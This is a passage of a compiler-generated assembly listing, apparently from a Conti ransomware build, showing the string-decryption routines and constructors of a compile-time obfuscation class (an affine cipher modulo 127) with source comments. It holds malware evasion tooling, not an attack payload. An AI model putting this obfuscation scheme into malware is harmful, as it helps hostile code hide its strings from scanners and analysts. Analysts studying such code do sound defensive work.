  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 48 00 00 00	 mov	 eax, 72			; 00000048H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2a	 imul	 ecx, eax, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<3,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$02$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$02$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<3,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<3,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 53	 mov	 BYTE PTR [rcx+1], 83	; 00000053H
  00007	c6 41 02 48	 mov	 BYTE PTR [rcx+2], 72	; 00000048H
  0000b	c6 41 03 12	 mov	 BYTE PTR [rcx+3], 18
  0000f	c6 41 04 48	 mov	 BYTE PTR [rcx+4], 72	; 00000048H
  00013	c6 41 05 76	 mov	 BYTE PTR [rcx+5], 118	; 00000076H
  00017	c6 41 06 48	 mov	 BYTE PTR [rcx+6], 72	; 00000048H
  0001b	c6 41 07 70	 mov	 BYTE PTR [rcx+7], 112	; 00000070H
  0001f	c6 41 08 48	 mov	 BYTE PTR [rcx+8], 72	; 00000048H
  00023	c6 41 09 48	 mov	 BYTE PTR [rcx+9], 72	; 00000048H
  00027	c6 41 0a 48	 mov	 BYTE PTR [rcx+10], 72	; 00000048H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$02$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<3,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<3,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CJ@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<41,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 15	 sub	 ecx, 21

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1f	 imul	 r8d, ecx, 31

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<41,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CJ@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CJ@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<41,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 02	 mov	 BYTE PTR [rcx+1], 2
  00007	c6 41 02 15	 mov	 BYTE PTR [rcx+2], 21
  0000b	c6 41 03 2d	 mov	 BYTE PTR [rcx+3], 45	; 0000002dH
  0000f	c6 41 04 15	 mov	 BYTE PTR [rcx+4], 21
  00013	c6 41 05 3d	 mov	 BYTE PTR [rcx+5], 61	; 0000003dH
  00017	c6 41 06 15	 mov	 BYTE PTR [rcx+6], 21
  0001b	c6 41 07 21	 mov	 BYTE PTR [rcx+7], 33	; 00000021H
  0001f	c6 41 08 15	 mov	 BYTE PTR [rcx+8], 21
  00023	c6 41 09 15	 mov	 BYTE PTR [rcx+9], 21
  00027	c6 41 0a 15	 mov	 BYTE PTR [rcx+10], 21
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0CJ@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<41,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DF@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6c		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 52	 sub	 ecx, 82			; 00000052H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00034	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00038	41 f7 e8	 imul	 r8d
  0003b	41 03 d0	 add	 edx, r8d
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	44 2b c0	 sub	 r8d, eax
  0004e	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00053	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00057	41 f7 e8	 imul	 r8d
  0005a	41 03 d0	 add	 edx, r8d
  0005d	c1 fa 06	 sar	 edx, 6
  00060	8b c2		 mov	 eax, edx
  00062	c1 e8 1f	 shr	 eax, 31
  00065	03 d0		 add	 edx, eax
  00067	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0006a	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006d	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00071	49 83 eb 01	 sub	 r11, 1
  00075	75 a9		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00077	49 8b c1	 mov	 rax, r9
  0007a	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DF@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<53,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 6b	 mov	 BYTE PTR [rcx+1], 107	; 0000006bH
  00007	c6 41 02 52	 mov	 BYTE PTR [rcx+2], 82	; 00000052H
  0000b	c6 41 03 11	 mov	 BYTE PTR [rcx+3], 17
  0000f	c6 41 04 52	 mov	 BYTE PTR [rcx+4], 82	; 00000052H
  00013	c6 41 05 10	 mov	 BYTE PTR [rcx+5], 16
  00017	c6 41 06 52	 mov	 BYTE PTR [rcx+6], 82	; 00000052H
  0001b	c6 41 07 51	 mov	 BYTE PTR [rcx+7], 81	; 00000051H
  0001f	c6 41 08 52	 mov	 BYTE PTR [rcx+8], 82	; 00000052H
  00023	c6 41 09 52	 mov	 BYTE PTR [rcx+9], 82	; 00000052H
  00027	c6 41 0a 52	 mov	 BYTE PTR [rcx+10], 82	; 00000052H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0DF@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<53,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DL@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<59,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 57	 sub	 ecx, 87			; 00000057H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1c	 imul	 r8d, ecx, 28

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<59,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DL@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DL@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<59,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<59,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 07	 mov	 BYTE PTR [rcx+1], 7
  00007	c6 41 02 57	 mov	 BYTE PTR [rcx+2], 87	; 00000057H
  0000b	c6 41 03 29	 mov	 BYTE PTR [rcx+3], 41	; 00000029H
  0000f	c6 41 04 57	 mov	 BYTE PTR [rcx+4], 87	; 00000057H
  00013	c6 41 05 5f	 mov	 BYTE PTR [rcx+5], 95	; 0000005fH
  00017	c6 41 06 57	 mov	 BYTE PTR [rcx+6], 87	; 00000057H
  0001b	c6 41 07 52	 mov	 BYTE PTR [rcx+7], 82	; 00000052H
  0001f	c6 41 08 57	 mov	 BYTE PTR [rcx+8], 87	; 00000057H
  00023	c6 41 09 57	 mov	 BYTE PTR [rcx+9], 87	; 00000057H
  00027	c6 41 0a 57	 mov	 BYTE PTR [rcx+10], 87	; 00000057H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0DL@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<59,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<59,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BN@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 78 00 00 00	 mov	 eax, 120		; 00000078H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BN@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
